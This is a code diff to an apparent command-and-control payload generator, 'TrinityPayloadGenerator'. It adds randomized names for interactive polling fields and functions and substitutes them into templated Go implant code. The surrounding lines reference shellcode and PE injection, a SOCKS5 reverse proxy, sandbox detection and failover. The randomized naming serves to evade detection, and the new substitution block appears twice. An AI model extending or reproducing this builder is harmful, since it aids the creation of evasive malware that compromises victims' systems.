@@ -281,6 +281,15 @@ class TrinityPayloadGenerator:
         agent_stop_reverse_proxy_func = poly.generate_random_name('stopReverseProxy') if include_reverse_proxy else 'stopReverseProxy_stub'
         agent_handle_socks5_func = poly.generate_random_name('handleSOCKS5') if include_reverse_proxy else 'handleSOCKS5_stub'
 
+        # Generate random names for interactive polling fields
+        agent_interactive_polling_field = poly.generate_go_field_name('InteractivePolling') if True else 'InteractivePolling_stub'
+        agent_interactive_polling_stop_chan_field = poly.generate_go_field_name('InteractivePollingStopChan') if True else 'InteractivePollingStopChan_stub'
+        agent_interactive_polling_thread_field = poly.generate_go_field_name('InteractivePollingThread') if True else 'InteractivePollingThread_stub'
+
+        # Generate random names for interactive polling functions
+        agent_start_interactive_polling_func = poly.generate_random_name('startInteractivePolling') if True else 'startInteractivePolling_stub'
+        agent_stop_interactive_polling_func = poly.generate_random_name('stopInteractivePolling') if True else 'stopInteractivePolling_stub'
+
         # Generate random names for sandbox functions (only if included)
         agent_check_sandbox_func = poly.generate_random_name('checkSandbox') if include_sandbox else 'checkSandbox_stub'
         agent_check_processes_for_sandbox_func = poly.generate_random_name('checkProcessesForSandbox') if include_sandbox else 'checkProcessesForSandbox_stub'
@@ -781,6 +790,8 @@ class TrinityPayloadGenerator:
         go_code = go_code.replace('{AGENT_INJECT_SHELLCODE_FUNC}', agent_inject_shellcode_func)
         go_code = go_code.replace('{AGENT_INJECT_PE_FUNC}', agent_inject_pe_func)
         go_code = go_code.replace('{AGENT_EXECUTE_PE_FUNC}', agent_execute_pe_func)
+        go_code = go_code.replace('{AGENT_START_INTERACTIVE_POLLING_FUNC}', agent_start_interactive_polling_func)
+        go_code = go_code.replace('{AGENT_STOP_INTERACTIVE_POLLING_FUNC}', agent_stop_interactive_polling_func)
 
         # Replace failover function names
         go_code = go_code.replace('{AGENT_TRY_FAILOVER_FUNC}', agent_try_failover_func)
@@ -801,10 +812,24 @@ class TrinityPayloadGenerator:
         go_code = go_code.replace('{AGENT_REVERSE_PROXY_STOP_CHAN_FIELD}', agent_reverse_proxy_stop_chan_field)
         go_code = go_code.replace('{AGENT_REVERSE_PROXY_LOCK_FIELD}', agent_reverse_proxy_lock_field)
 
+        # Replace interactive polling field names
+        go_code = go_code.replace('{AGENT_INTERACTIVE_POLLING_FIELD}', agent_interactive_polling_field)
+        go_code = go_code.replace('{AGENT_INTERACTIVE_POLLING_STOP_CHAN_FIELD}', agent_interactive_polling_stop_chan_field)
+        go_code = go_code.replace('{AGENT_INTERACTIVE_POLLING_THREAD_FIELD}', agent_interactive_polling_thread_field)
+
         # Replace reverse proxy function names
         go_code = go_code.replace('{AGENT_START_REVERSE_PROXY_FUNC}', agent_start_reverse_proxy_func)
         go_code = go_code.replace('{AGENT_STOP_REVERSE_PROXY_FUNC}', agent_stop_reverse_proxy_func)
         go_code = go_code.replace('{AGENT_HANDLE_SOCKS5_FUNC}', agent_handle_socks5_func)
+
+        # Replace interactive polling field names
+        go_code = go_code.replace('{AGENT_INTERACTIVE_POLLING_FIELD}', agent_interactive_polling_field)
+        go_code = go_code.replace('{AGENT_INTERACTIVE_POLLING_STOP_CHAN_FIELD}', agent_interactive_polling_stop_chan_field)
+        go_code = go_code.replace('{AGENT_INTERACTIVE_POLLING_THREAD_FIELD}', agent_interactive_polling_thread_field)
+
+        # Replace interactive polling function names
+        go_code = go_code.replace('{AGENT_START_INTERACTIVE_POLLING_FUNC}', agent_start_interactive_polling_func)
+        go_code = go_code.replace('{AGENT_STOP_INTERACTIVE_POLLING_FUNC}', agent_stop_interactive_polling_func)
 
         # Convert the profile headers dictionary to Go map literal format
         go_headers_parts = []
